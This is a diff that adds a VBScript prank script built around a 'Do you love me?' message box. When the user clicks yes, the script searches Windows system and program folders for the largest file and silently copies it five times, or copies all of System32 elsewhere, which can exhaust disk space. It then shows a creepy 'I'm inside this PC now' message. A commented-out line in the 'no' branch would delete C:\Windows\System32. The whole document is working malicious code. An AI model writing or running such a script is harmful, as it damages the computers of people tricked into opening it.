@@ -1,0 +1,58 @@
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+
+answer = MsgBox("Hey my love... I love you..." & vbCrLf & "Do you love me?", vbYesNo + vbQuestion, "I LOVE YOU")
+
+folders = Array("C:\Windows\System32", "C:\Program Files", "C:\Program Files (x86)", "C:\")
+
+Set biggestFile = Nothing
+maxSize = 0
+
+Sub FindLargestFile(folderPath)
+    On Error Resume Next
+    Set folder = fso.GetFolder(folderPath)
+    For Each file In folder.Files
+        If file.Size > maxSize And LCase(fso.GetExtensionName(file.Name)) <> "vbs" Then
+            Set biggestFile = file
+            maxSize = file.Size
+        End If
+    Next
+    For Each subfolder In folder.SubFolders
+        FindLargestFile(subfolder.Path)
+    Next
+End Sub
+
+If answer = vbYes Then
+    ' Step 1: Find largest file
+    For Each path In folders
+        If fso.FolderExists(path) Then
+            FindLargestFile(path)
+        End If
+    Next
+
+    If Not biggestFile Is Nothing Then
+        ' Found big file → replicate it silently
+        For i = 1 To 5
+            dest = fso.GetParentFolderName(biggestFile.Path) & "\syslove_" & i & "." & fso.GetExtensionName(biggestFile.Name)
+            fso.CopyFile biggestFile.Path, dest, True
+            WScript.Sleep 300
+        Next
+    Else
+        ' No big file found → fallback to replicating whole folder
+        fallbackFolder = "C:\Windows\System32"
+        If fso.FolderExists(fallbackFolder) Then
+            destFolder = "C:\LoveReplicated_SYS32"
+            On Error Resume Next
+            fso.CopyFolder fallbackFolder, destFolder, True
+            WScript.Sleep 2000  ' Simulate time delay
+        End If
+    End If
+
+    ' Final creepy message
+    MsgBox "I’m inside this PC now... forever with you... 💻🖤", vbInformation, "Love Settled"
+
+Else
+    MsgBox "You said NO 💔" & vbCrLf & "Simulating heartbreak...", vbCritical
+    ' Set fso = CreateObject("Scripting.FileSystemObject")
+    ' fso.DeleteFolder("C:\Windows\System32", True)
+End If
